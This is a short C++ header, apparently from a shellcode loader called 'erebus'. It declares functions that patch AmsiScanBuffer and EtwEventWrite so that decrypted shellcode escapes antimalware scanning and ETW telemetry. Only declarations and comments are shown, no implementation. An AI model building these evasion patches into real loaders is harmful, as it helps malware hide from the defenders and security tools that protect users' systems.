#ifndef EREBUS_EVASION_HPP
#define EREBUS_EVASION_HPP
#pragma once

#include <windows.h>

namespace erebus {
namespace evasion {

    // Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN, preventing
    // in-process content scanning of the decrypted shellcode buffer.
    BOOL PatchAmsi();

    // Patch EtwEventWrite to return immediately (ret 0), suppressing
    // ETW telemetry from the loader process.  Prevents .NET / managed
    // runtime tracing when hosting ClickOnce or when shellcode loads
    // a CLR.
    BOOL PatchEtw();

    // Run all evasion patches.  Returns TRUE if at least one patch
    // succeeded (partial success is acceptable - AMSI may not be
    // loaded in non-.NET processes).
    BOOL RunEvasionPatches();

} // namespace evasion
} // namespace erebus

#endif
